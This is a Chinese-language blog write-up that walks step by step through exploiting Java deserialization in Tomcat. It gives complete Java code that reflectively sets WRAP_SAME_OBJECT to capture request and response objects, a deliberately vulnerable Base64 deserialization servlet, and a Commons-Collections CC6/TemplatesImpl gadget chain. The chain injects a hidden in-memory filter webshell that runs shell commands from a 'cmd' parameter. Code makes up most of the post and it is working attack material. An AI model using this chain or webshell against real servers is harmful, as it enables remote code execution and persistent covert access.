## 获取req,rep

通过jsp我们能够简单的获取req和rep对象，因为jsp内置的方法，而反序列化我们如何获取上下文呢

在org.apache.catalina.core.ApplicationFilterChain类中定义了两个对象

![image-20240716160538840](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716160538840.png)

简单跟进这两个变量

在该类的internalDofilter方法下，存在if判断

![image-20240716160635426](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716160635426.png)

当WRAP_SAME_OBJECT为true时，会将request对象和response对象分别设置进对应的对象

在该类下存在静态代码块，如果WRAP_SAME_OBJECT为true,会初始化这两个对象，否则为null

![image-20240716161407532](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716161407532.png)

跟进到该变量赋值的位置org.apache.catalina.core.ApplicationDispatcher下的静态代码块

![image-20240716162803812](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716162803812.png)

![image-20240716163453380](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716163453380.png)

可以看到WRAP_SAME_OBJECT的初始值默认为false,我们需要反射修改为true,由于在执行类加载时，静态代码块就会被执行一次，两个lastservice会被设置为null,我们需要将其重新修改为对象

实现回显

```java
package org.example.javaweb;


import org.apache.catalina.core.ApplicationFilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

@WebServlet("/change")
public class ChangeServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp){
        try {

            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            setFinalStatic(WRAP_SAME_OBJECT_FIELD);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);

            Field lastserviceRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            setFinalStatic(lastserviceRequestField);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastserviceRequestField.get(null);

            Field lastserviceResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            setFinalStatic(lastserviceResponseField);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastserviceResponseField.get(null);

            String cmd = lastServicedRequest!=null ? lastServicedRequest.get().getParameter("cmd"):null;

            if ( lastServicedRequest == null || lastServicedResponse == null){
                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
                lastserviceRequestField.set(null,new ThreadLocal<>());
                lastserviceResponseField.set(null,new ThreadLocal<>());
            } else if (cmd!=null) {
                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                byte[] result = new byte[1024];
                int readSize=0;
                try(ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                    while ((readSize = in.read(result)) != -1) {
                        outputStream.write(result, 0, readSize);
                    }
                    lastServicedResponse.get().getWriter().println(outputStream.toString());
                }
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }

    public void setFinalStatic(Field field) throws NoSuchFieldException, IllegalAccessException {
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    }

}

```

在进行二次访问并带上cmd参数时，能够获得cmd参数并执行命令

![image-20240716232654417](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716232654417.png)

## 设置入口

写一个反序列化的入口，

cc:3.2.1

```java
package org.example.javaweb;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;


@WebServlet("/start")
public class TheStart extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String exp = req.getParameter("exp");
        byte[] decode = Base64.getDecoder().decode(exp.toString().replace("\r\n", ""));
        ByteArrayInputStream bain = new ByteArrayInputStream(decode);
        ObjectInputStream oin = new ObjectInputStream(bain);
        try {
            oin.readObject();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        resp.getWriter().write("Success");
    }
}

```

## 构造反序列化

这里选用cc6,注入filter内存马

### step 1

获取StandardContext对象，这和jsp不同的是，我们已经有servletRequest对象了，调用方法即可。获取后按照正常流程添加恶意filter即可

> 这里需要注意一点FilterExp不能使用匿名类的方式对恶意Servlet/Filter/Listener进行实例化,又要继承AbstractTranslet，因此我们选则继承父类Filter接口

```java
package org.example.javaweb;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.ApplicationContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.util.Map;

public class FilterExp extends AbstractTranslet implements Filter {
    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            setFinalStatic(WRAP_SAME_OBJECT_FIELD);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);

            Field lastserviceRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            setFinalStatic(lastserviceRequestField);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastserviceRequestField.get(null);

            Field lastserviceResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            setFinalStatic(lastserviceResponseField);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastserviceResponseField.get(null);

            if (lastServicedRequest == null || lastServicedResponse == null) {
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
                lastserviceRequestField.set(null, new ThreadLocal<>());
                lastserviceResponseField.set(null, new ThreadLocal<>());
            }else {
                ServletResponse servletResponse = lastServicedResponse.get();
                ServletRequest servletRequest = lastServicedRequest.get();
                //获取context
                ServletContext servletContext = servletRequest.getServletContext();
                Field appContext = servletContext.getClass().getDeclaredField("context");
                appContext.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
                //获取StandardContext
                Field stdContext = applicationContext.getClass().getDeclaredField("context");
                stdContext.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);

                Filter shellFilter = new FilterExp();
                String name = "shellfilter";
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(shellFilter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap  = new FilterMap();
                filterMap.setFilterName(name);
                filterMap.addURLPattern("/*");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                standardContext.addFilterMapBefore(filterMap);

                Field fieldconfigs = standardContext.getClass().getDeclaredField("filterConfigs");
                fieldconfigs.setAccessible(true);
                Map filterConfigs = (Map) fieldconfigs.get(standardContext);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterconfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

                filterConfigs.put(name,filterconfig);

                servletResponse.getWriter().write("Inject Success !");

            }
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void setFinalStatic(Field field) throws NoSuchFieldException, IllegalAccessException {
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if(servletRequest.getParameter("cmd") != null ){
            try {
                InputStream in = Runtime.getRuntime().exec(servletRequest.getParameter("cmd")).getInputStream();
                byte[] result = new byte[1024];
                int readSize = 0;
                try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                    while ((readSize = in.read(result)) != -1) {
                        outputStream.write(result, 0, readSize);
                    }
                    servletResponse.getWriter().println(outputStream.toString());
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }


}
```

### Step 2

在cc6中添加该类获取payload

```java
package org.example.javaweb;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.*;

import org.apache.commons.collections.map.LazyMap;

public class CC6 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl impl = new TemplatesImpl();
        byte[] code = getBytes();
        setFieldValue(impl, "_name", "uu2fu3o");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(impl),
                new InvokerTransformer("newTransformer", null, null)
        };
        Transformer[] fakeformer = new Transformer[]{};
        ChainedTransformer fakechain = new ChainedTransformer(fakeformer);
        Map map1 = new HashMap();
        Map lazy = LazyMap.decorate(map1, fakechain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "1");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "2");
        lazy.remove("1");
        //反射修改，将恶意链修改回去
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakechain, transformers);

//        serialize(hashMap);
//        unserialize("2.ser");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();
        System.out.println(URLEncoder.encode(new String(Base64.getEncoder().encode(barr.toByteArray()))));
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getBytes() throws IOException {
        try {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.get("org.example.javaweb.FilterExp"); // 替换为实际类名
            byte[] classBytes = ctClass.toBytecode(); // 获取字节码

            return classBytes;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }
}


```

将得到得payload传入，第一次修改，第二次注入

![image-20240717161928240](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240717161928240.png)

![image-20240717162002772](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240717162002772.png)

注入成功

